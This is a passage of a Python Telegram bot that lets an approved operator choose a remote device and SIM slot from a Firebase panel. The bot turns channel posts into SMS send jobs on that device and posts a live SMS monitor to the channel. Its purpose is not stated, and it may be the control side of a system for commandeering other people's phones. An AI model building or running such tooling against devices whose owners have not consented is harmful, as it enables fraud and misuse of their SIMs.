        await callback.answer("Only setup user can change pages.", show_alert=True)
        return
    devices = RUNTIME.devices or []
    if not devices:
        await callback.answer("No devices loaded. Run /start again.", show_alert=True)
        return

    page = int(callback.data.split(":", 1)[1])
    if callback.message:
        await callback.message.edit_reply_markup(reply_markup=build_devices_keyboard(devices, page))
    await callback.answer()


@router.callback_query(F.data.startswith("sel:"))
async def on_select_device(callback: CallbackQuery) -> None:
    if not await ensure_callback_approved(callback):
        return
    if not callback.from_user or callback.from_user.id != RUNTIME.operator_user_id:
        await callback.answer("Only setup user can select device.", show_alert=True)
        return

    device_id = callback.data.split(":", 1)[1]
    if callback.message:
        await callback.message.edit_reply_markup(reply_markup=None)
        await set_selected_device(callback.message, device_id)
    await callback.answer("Device selected. Pick SIM.")


@router.callback_query(F.data.startswith("sim:"))
async def on_select_sim(callback: CallbackQuery) -> None:
    if not await ensure_callback_approved(callback):
        return
    if not callback.from_user or callback.from_user.id != RUNTIME.operator_user_id:
        await callback.answer("Only setup user can select SIM.", show_alert=True)
        return
    if not RUNTIME.selected_device_id:
        await callback.answer("Select device first.", show_alert=True)
        return

    sim_slot = int(callback.data.split(":", 1)[1])
    RUNTIME.selected_sim_slot = sim_slot
    RUNTIME.awaiting_channel_id = True
    if callback.message:
        await callback.message.edit_text(
            f"Selected device: `{RUNTIME.selected_device_id}`\n"
            f"Selected SIM: `SIM {sim_slot}`\n"
            "Now send channel id to monitor (example: `-1001234567890`)."
        )
    await callback.answer(f"SIM {sim_slot} selected.")


@router.message(F.chat.type == ChatType.PRIVATE, F.text)
async def on_private_channel_id(message: Message) -> None:
    if not await ensure_private_approved(message):
        return
    if not RUNTIME.awaiting_channel_id:
        return
    if not message.from_user or message.from_user.id != RUNTIME.operator_user_id:
        return

    raw = message.text.strip()
    if raw.startswith("/"):
        return
    try:
        channel_id = int(raw)
    except ValueError:
        await message.answer("Invalid channel id. Send numeric id like `-1001234567890`.")
        return

    if channel_id >= 0:
        await message.answer("Channel id should be negative (example: `-1001234567890`).")
        return

    RUNTIME.channel_id = channel_id
    RUNTIME.awaiting_channel_id = False
    RUNTIME.monitor_message_id = None
    await allow_channel(channel_id, message.from_user.id if message.from_user else OWNER_ID)
    channel_post_ok = False
    channel_post_error: str | None = None
    try:
        monitor_msg = await message.bot.send_message(
            chat_id=RUNTIME.channel_id,
            text=build_sms_monitor_text(),
            parse_mode=ParseMode.HTML,
        )
        RUNTIME.monitor_message_id = monitor_msg.message_id
        await start_sms_live_monitor(message.bot)
        channel_post_ok = True
    except Exception as ex:  # noqa: BLE001
        channel_post_error = str(ex)

    if channel_post_ok:
        await message.answer(
            "Monitoring started and confirmation sent in channel.\n"
            f"Channel id: `{RUNTIME.channel_id}`"
        )
    else:
        await message.answer(
            "Channel id saved, but I could not post confirmation in that channel.\n"
            "Make sure bot is channel admin and channel id is correct.\n"
            f"Error: `{channel_post_error}`"
        )


@router.message(F.chat.type == ChatType.PRIVATE, F.text)
async def on_private_device_typed(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    current_state = await state.get_state()
    if current_state is not None:
        return
    if RUNTIME.awaiting_channel_id:
        return
    if RUNTIME.selected_device_id:
        return
    if not message.from_user or message.from_user.id != RUNTIME.operator_user_id:
        return
    if not RUNTIME.devices:
        return

    typed = message.text.strip()
    if not typed or typed.startswith("/"):
        return

    devices = RUNTIME.devices
    matched: str | None = None
    if typed in devices:
        matched = typed
    else:
        typed_lower = typed.lower()
        for device_id in devices:
            if device_id.lower() == typed_lower:
                matched = device_id
                break

    if not matched:
        await message.answer(
            "Device not found in ONLINE list.\n"
            "Select from menu or type exact device id."
        )
        return

    await set_selected_device(message, matched)


async def process_template_message(message: Message) -> None:
    if not (
        RUNTIME.firebase_url
        and RUNTIME.auth_key
        and RUNTIME.selected_device_id
        and RUNTIME.selected_sim_slot
        and RUNTIME.channel_id
    ):
        return
    if message.chat.id != RUNTIME.channel_id:
        return
    if not await is_channel_allowed(message.chat.id):
        # Safety net (shouldn't happen because we auto-leave on join)
        try:
            await message.bot.leave_chat(message.chat.id)
        except Exception:
            pass
        return
    t0 = time.perf_counter()
    if RUNTIME.devices is not None and RUNTIME.selected_device_id not in RUNTIME.devices:
        await message.answer(
            "Selected device is currently OFFLINE in panel list.\n"
            "Please reselect an ONLINE device."
        )
        return

    try:
        parsed = parse_template_block(message.text)
    except ValueError:
        return

    payload = {
        # Matches the panel UI payload shape in `src/pages/Dashboard.tsx`
        "from": int(RUNTIME.selected_sim_slot),
        "to": parsed.to,
        "message": parsed.message,
        "isSended": False,
        "createdAt": datetime.now(timezone.utc).isoformat(),
    }
    send_sms_url = build_send_sms_url(
        RUNTIME.firebase_url, RUNTIME.selected_device_id, RUNTIME.auth_key
    )
    try:
        result = await firebase_put_json(send_sms_url, payload)
        elapsed_s = time.perf_counter() - t0
        append_audit_log(
            {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "status": "queued",
                "deviceId": RUNTIME.selected_device_id,
                "simSlot": RUNTIME.selected_sim_slot,
                "to": parsed.to,
                "message": parsed.message,
                "elapsedSeconds": round(elapsed_s, 4),
                "result": result,
            }
        )
        await message.answer(
            "SMS queued via Firebase.\n"
            f"Device: `{RUNTIME.selected_device_id}` | SIM: `SIM {RUNTIME.selected_sim_slot}`\n"
            f"To: `{parsed.to}`\n"
            f"Elapsed: `{elapsed_s:.3f}s`\n"
            "Path: `clients/<deviceId>/webhookEvent/sendSms`"
        )
    except error.HTTPError as http_err:
        error_body = http_err.read().decode("utf-8", errors="replace")
        append_audit_log(
            {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "status": "http_error",
                "deviceId": RUNTIME.selected_device_id,
                "simSlot": RUNTIME.selected_sim_slot,
                "to": parsed.to,
                "message": parsed.message,
                "error": {
                    "code": http_err.code,
                    "reason": http_err.reason,
                    "body": error_body,
                },
            }
        )
        await message.answer(
            "Firebase HTTP error while queuing SMS.\n"
            f"Code: `{http_err.code}` Reason: `{http_err.reason}`"
        )
    except Exception as ex:  # noqa: BLE001
        append_audit_log(
            {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "status": "send_failed",
                "deviceId": RUNTIME.selected_device_id,
                "simSlot": RUNTIME.selected_sim_slot,
                "to": parsed.to,
                "message": parsed.message,
                "error": str(ex),
            }
        )
        await message.answer(f"Queue failed: `{ex}`")


@router.channel_post(F.text)
async def on_channel_post(message: Message) -> None:
    await process_template_message(message)


@router.edited_channel_post(F.text)
async def on_edited_channel_post(message: Message) -> None:
    await process_template_message(message)


@router.my_chat_member()
async def on_bot_added_or_updated(event: ChatMemberUpdated) -> None:
    """
    Enforce: bot must ONLY stay in channels that were pre-registered
    by an approved user via /setup_channel.
    """
    if event.chat.type != ChatType.CHANNEL:
        return
    new_status = event.new_chat_member.status
    old_status = event.old_chat_member.status

    joined = (
        old_status in {ChatMemberStatus.LEFT, ChatMemberStatus.KICKED}
        and new_status in {ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR}
    )
    upgraded = (
        old_status == ChatMemberStatus.MEMBER and new_status == ChatMemberStatus.ADMINISTRATOR
    )
    if not (joined or upgraded):
        return

    if not await is_channel_allowed(event.chat.id):
        try:
            await event.bot.leave_chat(event.chat.id)
        except Exception:
            pass


def prompt_non_empty(prompt_text: str) -> str:
    while True:
        value = input(prompt_text).strip()
        if value:
            return value
        print("Value cannot be empty.")


async def run() -> None:
    if load_dotenv is not None:
        load_dotenv(dotenv_path=Path(__file__).parent / ".env")

    # Ensure access store exists early.
    await access_data()

    token = os.getenv("TELEGRAM_BOT_TOKEN", "").strip() or prompt_non_empty(
        "Telegram bot token: "
    )
    bot = Bot(token=token, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
    dp = Dispatcher()
    dp.include_router(router)
    global HTTP_SESSION
    if aiohttp is not None:
        timeout = aiohttp.ClientTimeout(total=6, connect=2)
        HTTP_SESSION = aiohttp.ClientSession(timeout=timeout)

    async def refresh_online_devices_loop() -> None:
        while True:
            try:
                if RUNTIME.firebase_url and RUNTIME.auth_key:
                    RUNTIME.devices = await asyncio.to_thread(
                        fetch_online_test_devices, RUNTIME.firebase_url, RUNTIME.auth_key
                    )
            except Exception:
                # Keep bot alive even if a refresh attempt fails.
                pass
            await asyncio.sleep(DEVICE_REFRESH_INTERVAL_SECONDS)

    refresh_task = asyncio.create_task(refresh_online_devices_loop())
    print("Aiogram bot running. Use /start in private chat with bot.")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        global MONITOR_TASK
        if MONITOR_TASK is not None:
            MONITOR_TASK.cancel()
            try:
                await MONITOR_TASK
            except asyncio.CancelledError:
                pass
        refresh_task.cancel()
        try:
            await refresh_task
        except asyncio.CancelledError:
            pass
        if HTTP_SESSION is not None:
            await HTTP_SESSION.close()



def main() -> int:
    port = int(os.environ.get("PORT", 10000))

    async def start():
        config = uvicorn.Config(
            app,
            host="0.0.0.0",
            port=port,
            log_level="info"
        )
        server = uvicorn.Server(config)

        await asyncio.gather(
            server.serve(),
            run()
        )

    asyncio.run(start())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
